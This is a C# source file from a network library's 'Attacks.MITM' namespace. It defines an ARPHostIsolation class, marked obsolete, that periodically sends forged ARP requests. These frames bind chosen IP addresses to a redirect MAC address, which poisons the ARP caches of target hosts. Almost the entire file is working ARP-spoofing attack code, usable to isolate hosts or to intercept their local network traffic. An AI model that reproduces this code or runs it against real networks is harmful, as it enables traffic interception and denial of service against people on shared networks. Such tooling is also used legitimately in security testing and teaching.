using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Timers;
using eExNetworkLibrary.Utilities;
using eExNetworkLibrary.Ethernet;
using eExNetworkLibrary.ARP;

namespace eExNetworkLibrary.Attacks.MITM
{
    [Obsolete("This class is not NetworkLibraray 2.0 Compliant.", true)]
    class ARPHostIsolation
    {
        private WinPcapDotNet wpc;
        private List<ARPHostEntry> ipaToIsolate;
        private List<ARPHostEntry> ipaToSpoof;
        private MACAddress macAddressRedirectTo;
        int iPoisonInterval;
        Timer tTimer;

        #region Props

        public MACAddress RedirectTo
        {

            set { macAddressRedirectTo = value; }
            get { return macAddressRedirectTo; }
        }

        public int PoisonInterval
        {
            set
            {
                iPoisonInterval = value;
                tTimer.Interval = iPoisonInterval;
            }
            get { return iPoisonInterval; }
        }

        public ARPHostEntry[] IsolationList
        {
            get { return ipaToIsolate.ToArray(); }
        }

        public ARPHostEntry[] SpoofList
        {
            get { return ipaToSpoof.ToArray(); }
        }

        #endregion 

        public ARPHostIsolation(WinPcapDotNet wpc)
        {
            this.wpc = wpc;
            ipaToSpoof = new List<ARPHostEntry>();
            ipaToIsolate = new List<ARPHostEntry>();
            iPoisonInterval = 30000;
            tTimer = new Timer();
            tTimer.Interval = iPoisonInterval;
            tTimer.AutoReset = true;
            tTimer.Elapsed += new ElapsedEventHandler(tTimer_Elapsed);
            macAddressRedirectTo = MACAddress.Parse("CE:BA:B0:00:13:37");
        }

        void tTimer_Elapsed(object sender, ElapsedEventArgs e)
        {
            Poison();
        }

        public void AddToSpoofList(ARPHostEntry heEntry)
        {

            lock (ipaToSpoof)
            {
                ipaToSpoof.Add(heEntry);
            }
        }

        public void AddToIsolationList(ARPHostEntry heEntry)
        {   
            lock (ipaToIsolate)
            {
                ipaToIsolate.Add(heEntry);
            }
        }

        public void RemoveFromSpoofList(ARPHostEntry heEntry)
        {
            lock (ipaToSpoof)
            {
                ipaToSpoof.Remove(heEntry);
            }
        }

        public void RemoveFromIsolationList(ARPHostEntry heEntry)
        {
            lock (ipaToIsolate)
            {
                ipaToIsolate.Remove(heEntry);
            }
        }

        public void ClearSpoofList()
        {
            lock (ipaToSpoof)
            {
                ipaToSpoof.Clear();
            }
        }

        public void ClearIsolationList()
        {
            lock (ipaToIsolate)
            {
                ipaToIsolate.Clear();
            }
        }

        private void Poison()
        {
            EthernetFrame ethFrame;
            ARPFrame arpFrame;

            lock (ipaToIsolate)
            {
                foreach (ARPHostEntry heToIsolate in ipaToIsolate)
                {
                    lock (ipaToSpoof)
                    {
                        foreach (ARPHostEntry heToSpoof in ipaToSpoof)
                        {
                            if (heToIsolate != heToSpoof)
                            {
                                ethFrame = new EthernetFrame();
                                ethFrame.CanocialFormatIndicator = false;
                                ethFrame.Destination = heToIsolate.MAC;
                                ethFrame.Source = macAddressRedirectTo;
                                ethFrame.VlanTagExists = false;
                                ethFrame.EtherType = EtherType.ARP;

                                arpFrame = new ARPFrame();
                                arpFrame.DestinationIP = heToIsolate.IP;
                                arpFrame.DestinationMAC = MACAddress.Parse("00:00:00:00:00:00");
                                arpFrame.SourceIP = heToSpoof.IP;
                                arpFrame.SourceMAC = macAddressRedirectTo;
                                arpFrame.ProtocolAddressType = EtherType.IPv4;
                                arpFrame.HardwareAddressType = HardwareAddressType.Ethernet;
                                arpFrame.Operation = ARPOperation.Request;

                                ethFrame.EncapsulatedFrame = arpFrame;

                                wpc.SendPacket(ethFrame.FrameBytes);
                            }
                        }
                    }
                }
            }
        }

        public void Start()
        {
            Poison();
            tTimer.Enabled = true;
        }

        public void Stop()
        {
            tTimer.Enabled = false;
        }


    }
}
